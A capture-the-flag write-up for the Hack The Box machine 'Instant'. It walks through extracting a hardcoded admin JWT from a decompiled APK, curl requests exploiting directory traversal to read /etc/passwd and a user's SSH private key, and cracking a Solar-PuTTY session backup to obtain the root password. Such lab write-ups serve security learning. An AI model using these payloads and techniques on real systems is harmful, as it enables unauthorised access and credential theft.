---
layout: single
title: Instant - Hack The Box
excerpt: "Instant is a medium difficulty machine that includes reverse engineering a mobile application, exploiting API endpoints, and cracking encrypted hashes and files. Players will analyze an APK to extract sensitive information and a hardcoded authorization token, then they will exploit an API endpoint vulnerable to Arbitrary File Read. Finally, they will achieve full system compromise by decrypting and analyzing encrypted session data from Solar-PuTTY."
date: 2025-06-13
classes: wide
header:
  teaser: /img2/instant.png
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Linux
  - Medium
tags:
  - APK Analysis (apktool)
  - Information Leakage
  - API Enumeration (Swagger)
  - Directory Traversal + File Read (id_rsa)
  - Abusing SolarPutty Session Backup File (Brute Force) [Privilege Escalation]
---


## Reconnaissance

- Nmap 

```bash
❯ nmap -sS --open -p- --min-rate 5000 -n -Pn 10.10.11.37
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-12 14:08 CEST
Nmap scan report for 10.10.11.37
Host is up (0.085s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.71 seconds
```

- Add domain to /etc/hosts

```bash
❯ echo "10.10.11.37 instant.htb" >> /etc/hosts    
```

- Decompile apk file

```bash
❯ apktool d instant.apk -o instant
```

```ruby
I: Using Apktool 2.7.0-dirty on instant.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: /root/.local/share/apktool/framework/1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
I: Copying META-INF/services directory
```

- Find information leakage

```bash
❯ cat instant/res/xml/network_security_config.xml
```

```xml
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <domain-config cleartextTrafficPermitted="true">
        <domain includeSubdomains="true">mywalletv1.instant.htb</domain>
        <domain includeSubdomains="true">swagger-ui.instant.htb</domain>
    </domain-config>
</network-security-config>     
```

- Add subdomains to /etc/hosts

```bash
❯ echo "10.10.11.37 mywalletv1.instant.htb" >> /etc/hosts
```

```bash
❯ echo "10.10.11.37 swagger-ui.instant.htb" >> /etc/hosts
```

- Find apiKey JWT

```bash
❯ find . instant | xargs cat 2>/dev/null | grep -oP '[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}' | grep "^ey"
```

```ruby
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA
```

![](/img2/Pasted%20image%2020250613111633.png)

## Exploitation

- LFI in /admin/read/log endpoint

![](/img2/Pasted%20image%2020250613113236.png)

```bash
❯ curl -s -X GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd" -H  "accept: application/json" -H  "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA" | jq -r '.[].[]' 2>/dev/null | grep "sh$"
```

```ruby
root:x:0:0:root:/root:/bin/bash
shirohige:x:1001:1002:White Beard:/home/shirohige:/bin/bash
```

- Get Shirohige ssh private key

```bash
❯ curl -s -X GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=../../../../../../../../../home/shirohige/.ssh/id_rsa" -H  "accept: application/json" -H  "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA" | jq -r '.[].[]' 2>/dev/null | grep -v '^$' > id_rsa && chmod 600 id_rsa
```

```bash
❯ ssh -i id_rsa shirohige@10.10.11.37
```

```ruby
The authenticity of host '10.10.11.37 (10.10.11.37)' can't be established.
ED25519 key fingerprint is SHA256:r+JkzsLsWoJi57npPp0MXIJ0/vVzZ22zbB7j3DWmdiY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.37' (ED25519) to the list of known hosts.
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-45-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
shirohige@instant:~$
```

## Post-exploitation

- Leaked Solar-PuTTY session

```bash
shirohige@instant:/opt/backups/Solar-PuTTY$ cat sessions-backup.dat ;echo
```

```ruby
ZJlEkpkqLgj2PlzCyLk4gtCfsGO2CMirJoxxdpclYTlEshKzJwjMCwhDGZzNRr0fNJMlLWfpbdO7l2fEbSl/OzVAmNq0YO94RBxg9p4pwb4upKiVBhRY22HIZFzy6bMUw363zx6lxM4i9kvOB0bNd/4PXn3j3wVMVzpNxuKuSJOvv0fzY/ZjendafYt1Tz1VHbH4aHc8LQvRfW6Rn+5uTQEXyp4jE+ad4DuQk2fbm9oCSIbRO3/OKHKXvpO5Gy7db1njW44Ij44xDgcIlmNNm0m4NIo1Mb/2ZBHw/MsFFoq/TGetjzBZQQ/rM7YQI81SNu9z9VVMe1k7q6rDvpz1Ia7JSe6fRsBugW9D8GomWJNnTst7WUvqwzm29dmj7JQwp+OUpoi/j/HONIn4NenBqPn8kYViYBecNk19Leyg6pUh5RwQw8Bq+6/OHfG8xzbv0NnRxtiaK10KYh++n/Y3kC3t+Im/EWF7sQe/syt6U9q2Igq0qXJBF45Ox6XDu0KmfuAXzKBspkEMHP5MyddIz2eQQxzBznsgmXT1fQQHyB7RDnGUgpfvtCZS8oyVvrrqOyzOYl8f/Ct8iGbv/WO/SOfFqSvPQGBZnqC8Id/enZ1DRp02UdefqBejLW9JvV8gTFj94MZpcCb9H+eqj1FirFyp8w03VHFbcGdP+u915CxGAowDglI0UR3aSgJ1XIz9eT1WdS6EGCovk3na0KCz8ziYMBEl+yvDyIbDvBqmga1F+c2LwnAnVHkFeXVua70A4wtk7R3jn8+7h+3Evjc1vbgmnRjIp2sVxnHfUpLSEq4oGp3QK+AgrWXzfky7CaEEEUqpRB6knL8rZCx+Bvw5uw9u81PAkaI9SlY+60mMflf2r6cGbZsfoHCeDLdBSrRdyGVvAP4oY0LAAvLIlFZEqcuiYUZAEgXgUpTi7UvMVKkHRrjfIKLw0NUQsVY4LVRaa3rOAqUDSiOYn9F+Fau2mpfa3c2BZlBqTfL9YbMQhaaWz6VfzcSEbNTiBsWTTQuWRQpcPmNnoFN2VsqZD7d4ukhtakDHGvnvgr2TpcwiaQjHSwcMUFUawf0Oo2+yV3lwsBIUWvhQw2g=
```

- Brute Force Solar-PuTTY session hash

```bash
❯ ./sp_crack /usr/share/wordlists/rockyou.txt ../hash.txt
```

```ruby
Current platform cannot try to decrypt session data without password: Operation is not supported on this platform.
This is expected on Linux and MacOS. Will continue to try to decrypt with password.
Decrypted: {"Sessions":[{"Id":"066894ee-635c-4578-86d0-d36d4838115b","Ip":"10.10.11.37","Port":22,"ConnectionType":1,"SessionName":"Instant","Authentication":0,"CredentialsID":"452ed919-530e-419b-b721-da76cbe8ed04","AuthenticateScript":"00000000-0000-0000-0000-000000000000","LastTimeOpen":"0001-01-01T00:00:00","OpenCounter":1,"SerialLine":null,"Speed":0,"Color":"#FF176998","TelnetConnectionWaitSeconds":1,"LoggingEnabled":false,"RemoteDirectory":""}],"Credentials":[{"Id":"452ed919-530e-419b-b721-da76cbe8ed04","CredentialsName":"instant-root","Username":"root","Password":"12**24nzC!r0c%q12","PrivateKeyPath":"","Passphrase":"","PrivateKeyContent":null}],"AuthScript":[],"Groups":[],"Tunnels":[],"LogsFolderDestination":"C:\\ProgramData\\SolarWinds\\Logs\\Solar-PuTTY\\Sessio
Password founnd: estrella
```

> Password: 12*\*24nzC!r0c%q12

```bash
shirohige@instant:/opt/backups/Solar-PuTTY$ su root 
```

```ruby
Password: 
root@instant:/opt/backups/Solar-PuTTY#
```


![](/img2/Pasted%20image%2020250613121954.png)